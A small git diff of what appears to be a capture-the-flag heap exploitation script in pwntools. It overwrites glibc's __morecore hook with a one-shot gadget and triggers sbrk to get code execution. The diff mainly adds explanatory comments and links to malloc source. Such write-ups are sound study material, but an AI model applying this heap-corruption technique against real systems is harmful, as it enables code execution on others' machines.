@@ -64,13 +64,15 @@ def pwn():
 	__morecore = libc + 0x3c53b0
 	log.success('Libc: 0x{:x}'.format(libc))
 
-	# overwrite __morecore hook
+	# overwrite alien #9 name pointer with __morecore hook
 	alloc(0x200, 'W'*0x150 + p64(0) + p64(0x21) + p64(__morecore) + p64(0)) # 11
-
+	# __morecore hook => one shot gadget
 	edit(9, p64(one_shot))
 
 	# exhaust av->top and trigger sbrk/__morecore.
+	# https://github.com/str8outtaheap/heapwn/blob/master/malloc/sysmalloc.c#L224
 	# we gotta avoid triggering mmap. its threshold is 0x20000.
+	# https://github.com/str8outtaheap/heapwn/blob/master/malloc/sysmalloc.c#L42
 	alloc(0x1f000, 'A'*10)
 	r.sendlineafter('today.\n', '1')
 	r.sendlineafter('name?\n', str(0x1f000))
